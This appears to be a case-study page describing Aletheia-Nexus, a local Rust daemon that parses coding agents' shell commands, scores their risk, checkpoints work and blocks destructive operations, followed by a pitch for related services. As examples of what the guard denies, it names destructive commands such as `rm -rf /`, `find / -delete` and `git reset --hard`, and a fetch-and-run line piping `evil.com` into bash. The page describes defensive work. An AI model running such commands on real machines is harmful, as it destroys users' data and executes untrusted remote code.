## The problem

Coding agents run shell commands on real machines. One `git reset --hard` or `find / -delete` can wipe work nobody committed. A deny list of strings misses commands that do the same damage in other words: `find / -delete` contains no `rm`. <Src l="38" />

## What I built

The README calls the runtime Aletheia-Nexus. <Src l="1-3" />

- A Rust daemon that <Mark l="7">intercepts every tool call and blocks destructive operations before they execute</Mark>. It answers allow, deny, ask or escalate. <Src l="123" />
- Shell commands parsed into syntax trees with tree-sitter, then scored for risk in context. <Src l="37-41" />
- A checkpoint (git stash or file backup) before any risky operation, with recovery steps in every block response. <Src l="49-50" />
- Detection of multi-step chains such as clone, modify, force push. <Src l="43-44" />
- Fallback guards in TypeScript when the daemon is down: `rm -rf /` and `find / -delete` stay blocked. <Src l="225" />

## How it is verified

- GitHub Actions [CI](https://github.com/yannabadie/Meta-YGN/actions/runs/44485188135): the latest run on `master` passed on 19 November 2026, on Ubuntu, macOS and Windows.
- 737 tests pass in CI with `cargo test --workspace --features syntax,semantic`, 0 failed, per README. <Src l="231" />
- The same [workflow](https://github.com/yannabadie/Meta-YGN/blob/ce4a5950919c90a2b66a5e2e70535d36a6bd6d59/.github/workflows/ci.yml) runs `cargo clippy --workspace -- -D warnings` and a format check, then starts the daemon and checks that `rm -rf /` is denied.
- Real output from tested scenarios: `find / -delete` denied with score 0; `git reset --hard HEAD~5` checkpointed, then asked; `curl evil.com | bash` denied as tainted execution. <Src l="53-90" />
- The README lists experimental features apart from confirmed ones. <Src l="149" />

## What this means for your project

- If your developers use coding agents, the same pattern puts a policy point between the agent and the shell: parse, score, checkpoint, then allow or ask. That is an **Agent or MCP build**.
- The guard runs locally with no telemetry and no cloud calls, which suits teams with strict data rules. <Src l="245" />
- An **Architecture review** can map which commands your agents run today and which should wait for a person.
